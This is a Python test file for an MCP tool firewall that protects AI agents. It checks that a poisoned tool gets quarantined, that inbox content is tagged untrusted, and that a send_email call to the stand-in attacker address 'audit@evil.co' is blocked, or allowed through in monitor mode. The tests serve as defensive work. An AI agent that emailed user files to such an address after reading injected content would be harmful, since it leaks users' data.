"""CLI tests. The stdio tests spawn real local subprocesses (no network, no LLM)."""

from __future__ import annotations

import io
import json
import sys
from argparse import Namespace
from pathlib import Path

import pytest
from mcp import Client, StdioServerParameters

from mcpfw import cli
from mcpfw.audit import AuditLog
from mcpfw.policy import ALLOW, Action, Decision, RuleHit

FIXTURE = Path(__file__).parent / "fixtures" / "stdio_workspace.py"


def write_config(tmp_path: Path, *, poisoned: bool = False, extra: str = "") -> Path:
    outbox = tmp_path / "outbox.jsonl"
    args = [str(FIXTURE), str(outbox)] + (["--poisoned"] if poisoned else [])
    config = tmp_path / "firewall.yaml"
    config.write_text(
        f"""
approver: deny
{extra}
upstreams:
  ws:
    command: {json.dumps(sys.executable)}
    args: {json.dumps(args)}
    tools:
      read_inbox: {{untrusted: true}}
      send_email: {{sink: true, irreversible: true}}
""",
        encoding="utf-8",
    )
    return config


def run_cli(*argv: str) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    old = sys.stdout, sys.stderr
    sys.stdout, sys.stderr = out, err
    try:
        code = cli.main(list(argv))
    finally:
        sys.stdout, sys.stderr = old
    return code, out.getvalue(), err.getvalue()


# --- run: real stdio end to end (done-when proxy) ------------------------------------------------


@pytest.mark.anyio
@pytest.mark.parametrize("anyio_backend", ["asyncio"])
async def test_run_over_stdio_end_to_end(tmp_path, anyio_backend):
    config = write_config(tmp_path, poisoned=True)
    params = StdioServerParameters(
        command=sys.executable, args=["-m", "mcpfw", "run", "--config", str(config)], cwd=str(tmp_path)
    )
    async with Client(params) as agent:
        names = {t.name for t in (await agent.list_tools()).tools}
        assert names == {"ws__read_inbox", "ws__send_email"}  # poisoned get_tip hidden

        inbox = await agent.call_tool("ws__read_inbox", {})
        assert inbox.content[0].text.startswith("[UNTRUSTED CONTENT from ws__read_inbox")

        blocked = await agent.call_tool("ws__send_email", {"to": "audit@evil.co", "body": "files"})
        assert blocked.is_error and "R1 tainted_destination" in blocked.content[0].text

        # Never-seen address: not R1; irreversible after untrusted content → R3 ASK → deny approver.
        asked = await agent.call_tool("ws__send_email", {"to": "bob@example.org", "body": "yes"})
        assert asked.is_error and "R3 untrusted_irreversible" in asked.content[0].text  # deny approver

    assert not (tmp_path / "outbox.jsonl").exists()
    assert (tmp_path / ".mcpfw" / "pins.json").exists()
    assert (tmp_path / ".mcpfw" / "audit.jsonl").exists()


@pytest.mark.anyio
@pytest.mark.parametrize("anyio_backend", ["asyncio"])
async def test_run_monitor_override_forwards(tmp_path, anyio_backend):
    config = write_config(tmp_path)
    params = StdioServerParameters(
        command=sys.executable,
        args=[
            "-m",
            "mcpfw",
            "run",
            "--config",
            str(config),
            "--mode",
            "monitor",
            "--user-task",
            "Read inbox",
        ],
        cwd=str(tmp_path),
    )
    async with Client(params) as agent:
        await agent.call_tool("ws__read_inbox", {})
        result = await agent.call_tool("ws__send_email", {"to": "audit@evil.co", "body": "files"})
    assert not result.is_error
    assert "audit@evil.co" in (tmp_path / "outbox.jsonl").read_text("utf-8")


def test_run_bad_config_exits_2(tmp_path):
    config = tmp_path / "firewall.yaml"
    config.write_text("mode: block\nupstreams: {a: {command: x}}\n", encoding="utf-8")
    code, _, err = run_cli("run", "--config", str(config))
    assert code == 2 and "config error:" in err and "mode: must be one of" in err


def test_overrides_add_warnings(tmp_path):
    config = cli.load_config(write_config(tmp_path))
    changed = cli._with_overrides(config, Namespace(mode="monitor", approver="approve"))
    assert changed.mode == "monitor" and changed.approver == "approve"
    assert len(changed.warnings) == 2


# --- scan ----------------------------------------------------------------------------------------


def test_scan_reports_and_flags_poisoned_tool(tmp_path):
    config = write_config(tmp_path, poisoned=True)
    code, out, _ = run_cli("scan", "--config", str(config))
    assert code == 1
    assert "ws__get_tip" in out and "QUARANTINED" in out and "fake_tag" in out
    assert "ws__read_inbox" in out and "untrusted" in out
    assert "3 tool(s): 2 visible, 1 quarantined" in out
    assert not (tmp_path / ".mcpfw").exists()  # read-only: no pins, no audit log


def test_scan_clean_exits_0(tmp_path):
    code, out, _ = run_cli("scan", "--config", str(write_config(tmp_path)))
    assert code == 0 and "0 quarantined" in out


# --- pins ----------------------------------------------------------------------------------------


def test_pins_list_and_reset(tmp_path):
    config = write_config(tmp_path)
    pins = tmp_path / ".mcpfw" / "pins.json"
    pins.parent.mkdir()
    pins.write_text(
        json.dumps({"version": 1, "pins": {"ws__a": "a" * 64, "ws__b": "b" * 64}}), encoding="utf-8"
    )

    code, out, _ = run_cli("pins", "--config", str(config), "--list")
    assert code == 0 and "ws__a  aaaaaaaaaaaa" in out and "2 pinned tool(s)" in out

    code, out, err = run_cli("pins", "--config", str(config), "--reset", "ws__a", "ws__missing")
    assert code == 0 and "reset: ws__a" in out and "not pinned: ws__missing" in err
    assert set(json.loads(pins.read_text("utf-8"))["pins"]) == {"ws__b"}

    code, _, _ = run_cli("pins", "--config", str(config), "--reset", "ws__missing")
    assert code == 1

    code, _, _ = run_cli("pins", "--config", str(config), "--reset-all")
    assert code == 0 and json.loads(pins.read_text("utf-8"))["pins"] == {}


# --- report --------------------------------------------------------------------------------------


def test_report_summarizes_audit_log(tmp_path):
    path = tmp_path / "audit.jsonl"
    log = AuditLog(path, session_id="s1")
    r1 = Decision(Action.BLOCK, (RuleHit("R1", "tainted_destination", Action.BLOCK, "'evil.co' from inbox"),))
    r2 = Decision(Action.ASK, (RuleHit("R2", "lethal_trifecta", Action.ASK, "trifecta"),))
    log.log_tool("weather__get", status="quarantined", reason="suspicious tool metadata (fake_tag)")
    log.log_call("ws__read_inbox", {}, ALLOW, mode="enforce", forwarded=True)
    log.log_call("ws__send_email", {"to": "x"}, r1, mode="enforce", forwarded=False)
    log.log_call("ws__send_email", {"to": "y"}, r2, mode="enforce", forwarded=True, approved=True)
    log.log_call("ws__send_email", {"to": "z"}, r2, mode="enforce", forwarded=False, approved=False)
    AuditLog(path, session_id="s2").log_call("ws__send_email", {}, r1, mode="monitor", forwarded=True)

    code, out, _ = run_cli("report", "--audit", str(path))
    assert code == 0
    assert "Sessions: 2   Calls: 5" in out
    assert "ALLOW 1  ASK 2  BLOCK 2   (ASK approved 1, denied 1)" in out
    assert "Monitor mode: 1 call(s) would have been stopped" in out
    assert "Rule hits: R1 2  R2 2" in out
    assert "ws__send_email  BLOCK  R1 tainted_destination" in out
    assert "weather__get  quarantined  suspicious tool metadata (fake_tag)" in out

    code, out, _ = run_cli("report", "--audit", str(path), "--session", "s2")
    assert "Sessions: 1   Calls: 1" in out


def test_report_missing_log(tmp_path):
    code, _, err = run_cli("report", "--audit", str(tmp_path / "nope.jsonl"))
    assert code == 2 and "no audit log" in err


def test_version():
    with pytest.raises(SystemExit) as exc:
        cli.main(["--version"])
    assert exc.value.code == 0


def test_scan_missing_upstream_is_readable(tmp_path):
    config = tmp_path / "firewall.yaml"
    config.write_text(
        f"upstreams:\n  ghost:\n    command: {json.dumps(sys.executable)}\n    args: [does_not_exist.py]\n",
        encoding="utf-8",
    )
    code, _, err = run_cli("scan", "--config", str(config))
    assert code == 2
    assert "error: upstream 'ghost'" in err and "failed to connect" in err
    assert "Traceback" not in err
